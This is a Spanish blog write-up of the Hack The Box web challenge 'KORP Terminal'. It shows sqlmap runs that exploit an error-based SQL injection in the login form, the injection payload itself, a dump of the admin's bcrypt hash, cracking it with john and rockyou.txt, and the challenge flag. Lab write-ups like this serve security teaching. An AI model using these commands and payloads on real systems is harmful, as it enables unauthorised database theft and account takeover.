<!doctype html><html lang="es"><head><title>KORP Terminal | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Inyección de código SQL. Descifrado de _hashes_ de contraseñas"><meta name="image" content="https://7rocky.github.io/images/web.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Inyección de código SQL. Descifrado de _hashes_ de contraseñas"><meta itemprop="keywords" content><meta itemprop="name" content="KORP Terminal"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Inyección de código SQL. Descifrado de _hashes_ de contraseñas"><meta property="og:image" content="https://7rocky.github.io/images/web.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="KORP Terminal"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/web/korp-terminal/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Inyección de código SQL. Descifrado de _hashes_ de contraseñas"><meta name="twitter:description" content="Inyección de código SQL. Descifrado de _hashes_ de contraseñas"><meta name="twitter:image" content="https://7rocky.github.io/images/web.png"><meta name="twitter:title" content="KORP Terminal"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/htb-challenges/web/korp-terminal/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/htb-challenges/web/korp-terminal/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- WEB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/web/korp-terminal/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/web/korp-terminal/&amp;text=KORP%20Terminal" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/htb-challenges/web/korp-terminal/&amp;title=KORP%20Terminal" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">KORP Terminal</h1><p class="mb4 f6 dib tracked">6 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#inyección-de-código-sql">Inyección de código SQL</a><ul><li><a href="#extracción-de-la-base-de-datos">Extracción de la base de datos</a></li></ul></li><li><a href="#descifrado-de-_hashes_-de-contraseñas">Descifrado de <em>hashes</em> de contraseñas</a></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona esta página web:</p><p><img alt="KORP Terminal 1" src="/images/HTB-Challenges/HTB-Web-KORP-Terminal-1.webp"></p><p>Solo nos permite iniciar sesión. Podemos probar una cuenta aleatoria, pero no tiene éxito:</p><p><img alt="KORP Terminal 2" src="/images/HTB-Challenges/HTB-Web-KORP-Terminal-2.webp"></p><p><img alt="KORP Terminal 3" src="/images/HTB-Challenges/HTB-Web-KORP-Terminal-3.webp"></p><h2 id="inyección-de-código-sql">Inyección de código SQL</h2><p>Como no tenemos ningún código fuente y solo tenemos un formulario de inicio de sesión, intentemos inyectar código SQL. Podemos suponer que las credenciales se verifican contra una base de datos, que es muy probable que sea una base de datos SQL.</p><p>Si probamos una comilla simple, recibiremos un error:</p><p><img alt="KORP Terminal 4" src="/images/HTB-Challenges/HTB-Web-KORP-Terminal-4.webp"></p><p><img alt="KORP Terminal 5" src="/images/HTB-Challenges/HTB-Web-KORP-Terminal-5.webp"></p><p>Como se puede ver, estamos tratando con MariadB (una especie de administrador de bases de datos MySQL). Por lo tanto, estamos en el camino correcto.</p><h3 id="extracción-de-la-base-de-datos">Extracción de la base de datos</h3><p>En este punto, podemos hacer uso de <a target="_blank" href="https://github.com/sqlmapproject/sqlmap"><code>sqlmap</code></a> para volcar la base de datos.Enumeraremos bases de datos, luego elegiremos una base de datos y listaremos las tablas, luego elegiremos una tabla y la volcaremos. Hay que tener en cuenta que podemos decirle a <code>sqlmap</code> que estamos tratando con MySQL, que el campo <code>username</code> es inyectable y que tenemos un SQLi basado en error.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqlmap</span> --url http://94.237.62.255:31811 --method POST --data <span class="code-dark-yellow">'username=*&password=x'</span> --technique E --skip-waf --dbms MySQL --batch --dbs
<span class="code-yellow">        ___</span>
<span class="code-yellow">       __H__</span>
<span class="code-yellow"> ___ ___[<span class="code-bg-red">.</span>]_____ ___ ___</span>  <span class="code-white">{<span class="code-grey">1.8.9#stable</span>}</span>
<span class="code-yellow">|_ -| . [<span class="code-bg-red">'</span>]     | .'| . |</span>
<span class="code-yellow">|___|_  [<span class="code-bg-red">,</span>]_|_|_|__,|  _|</span>
<span class="code-yellow">      |_|V...       |_|</span>   <span class="mtku code-white">https://sqlmap.org</span>

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program  

[*] starting

<span class="code-white">custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y</span>
[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>]<span class="code-white"> testing connection to the target URL</span></span>
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-yellow">WARNING</span>] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>]<span class="code-white"> heuristic (basic) test shows that (custom) POST parameter '<span class="code-white">#1*<span class="code-white">' might be injectable (possible DBMS: '<span class="code-white">MySQL<span class="code-white">')</span></span></span></span></span></span>
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing for SQL injection on (custom) POST parameter '<span class="code-white">#1*</span>'
<span class="code-white">for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y</span>
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing '<span class="code-white">MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing '<span class="code-white">MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing '<span class="code-white">MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing '<span class="code-white">MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing '<span class="code-white">MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-yellow">WARNING</span>] potential permission problems detected ('<span class="code-white">command denied</span>')
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing '<span class="code-white">MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing '<span class="code-white">MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing '<span class="code-white">MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing '<span class="code-white">MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>]<span class="code-white"> (custom) POST parameter '<span class="code-white">#1*<span class="code-white">' is '<span class="code-white">MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)<span class="code-white">' injectable </span></span></span></span></span></span>
<span class="code-white">(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span>
sqlmap identified the following injection point(s) with a total of 136 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username='||(SELECT 0x6341556a WHERE 4610=4610 AND (SELECT 2781 FROM(SELECT COUNT(*),CONCAT(0x7170717071,(SELECT (ELT(2781=2781,1))),0x716a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&password=x
---
[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>]<span class="code-white"> the back-end DBMS is MySQL</span></span>
back-end DBMS: MySQL &gt;= 5.0 (<span class="code-white">MariaDB </span>fork)
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching database names
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: '<span class="code-white">information_schema</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: '<span class="code-white">test</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: '<span class="code-white">korp_terminal</span>'
available databases [3]:
[*] information_schema
[*] korp_terminal
[*] test

[*] ending

<span class="code-cyan">$</span> <span class="code-dark-green">sqlmap</span> --url http://94.237.62.255:31811 --method POST --data <span class="code-dark-yellow">'username=*&password=x'</span> --technique E --skip-waf --dbms MySQL --batch -D korp_terminal --tables
<span class="code-yellow">        ___</span>
<span class="code-yellow">       __H__</span>
<span class="code-yellow"> ___ ___[<span class="code-bg-red">(</span>]_____ ___ ___</span>  <span class="code-white">{<span class="code-grey">1.8.9#stable</span>}</span>
<span class="code-yellow">|_ -| . [<span class="code-bg-red">(</span>]     | .'| . |</span>
<span class="code-yellow">|___|_  [<span class="code-bg-red">,</span>]_|_|_|__,|  _|</span>
<span class="code-yellow">      |_|V...       |_|</span>   <span class="mtku code-white">https://sqlmap.org</span>

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting

<span class="code-white">custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y</span>
[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>]<span class="code-white"> testing connection to the target URL</span></span>
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-yellow">WARNING</span>] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username='||(SELECT 0x6341556a WHERE 4610=4610 AND (SELECT 2781 FROM(SELECT COUNT(*),CONCAT(0x7170717071,(SELECT (ELT(2781=2781,1))),0x716a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&password=x
---
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing MySQL
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] confirming MySQL
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-yellow">WARNING</span>] potential permission problems detected ('<span class="code-white">command denied</span>')
[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>]<span class="code-white"> the back-end DBMS is MySQL</span></span>
back-end DBMS: MySQL &gt;= 5.0.0 (<span class="code-white">MariaDB </span>fork)
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching tables for database: '<span class="code-white">korp_terminal</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: '<span class="code-white">users</span>'
Database: korp_terminal
[1 table]
+-------+
| users |
+-------+

[*] ending

<span class="code-cyan">$</span> <span class="code-dark-green">sqlmap</span> --url http://94.237.62.255:31811 --method POST --data <span class="code-dark-yellow">'username=*&password=x'</span> --technique E --skip-waf --dbms MySQL --batch -D korp_terminal -T use
rs --dump
<span class="code-yellow">        ___</span>
<span class="code-yellow">       __H__</span>
<span class="code-yellow"> ___ ___[<span class="code-bg-red">.</span>]_____ ___ ___</span>  <span class="code-white">{<span class="code-grey">1.8.9#stable</span>}</span>
<span class="code-yellow">|_ -| . [<span class="code-bg-red">'</span>]     | .'| . |</span>
<span class="code-yellow">|___|_  [<span class="code-bg-red">"</span>]_|_|_|__,|  _|</span>
<span class="code-yellow">      |_|V...       |_|</span>   <span class="mtku code-white">https://sqlmap.org</span>

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting

<span class="code-white">custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y</span>
[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>]<span class="code-white"> testing connection to the target URL</span></span>
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-yellow">WARNING</span>] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username='||(SELECT 0x6341556a WHERE 4610=4610 AND (SELECT 2781 FROM(SELECT COUNT(*),CONCAT(0x7170717071,(SELECT (ELT(2781=2781,1))),0x716a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&password=x
---
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing MySQL
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] confirming MySQL
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-yellow">WARNING</span>] potential permission problems detected ('<span class="code-white">command denied</span>')
[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>]<span class="code-white"> the back-end DBMS is MySQL</span></span>
back-end DBMS: MySQL &gt;= 5.0.0 (<span class="code-white">MariaDB </span>fork)
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching columns for table '<span class="code-white">users</span>' in database '<span class="code-white">korp_terminal</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: '<span class="code-white">id</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: '<span class="code-white">int(11)</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: '<span class="code-white">username</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: '<span class="code-white">varchar(255)</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: '<span class="code-white">password</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: '<span class="code-white">varchar(255)</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching entries for table '<span class="code-white">users</span>' in database '<span class="code-white">korp_terminal</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: '<span class="code-white">1</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: '<span class="code-white">$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.</span>'
[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: '<span class="code-white">admin</span>'
Database: korp_terminal
Table: users
[1 entry]
+----+--------------------------------------------------------------+----------+
| id | password                                                     | username |
+----+--------------------------------------------------------------+----------+
| 1  | $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv. | admin    |
+----+--------------------------------------------------------------+----------+

[*] ending
</code></pre></div><h2 id="descifrado-de-_hashes_-de-contraseñas">Descifrado de <em>hashes</em> de contraseñas</h2><p>Entonces, obtenemos el <em>hash</em> de la contraseña del usuario <code>admin</code>. Tratemos de romperlo usando <code>john</code> y <code>rockyou.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">john</span> --wordlist=$WORDLISTS/rockyou.txt <span class="code-dark-magenta">&lt;(<span class="code-dark-green">echo</span> <span class="code-dark-yellow">'$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.'</span>)</span>  
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
1g 0:00:01:49 100% 0.009120g/s 12.64p/s 12.64c/s 12.64C/s password123..peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>En este punto, podemos iniciar sesión usando las credenciales <code>admin:password123</code>, y veremos la <em>flag</em>:</p><p><img alt="KORP Terminal 6" src="/images/HTB-Challenges/HTB-Web-KORP-Terminal-6.webp"></p><p><img alt="KORP Terminal 7" src="/images/HTB-Challenges/HTB-Web-KORP-Terminal-7.webp"></p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">HTB{t3rm1n4l_cr4ck1ng_4nd_0th3r_sh3n4nig4n5}  
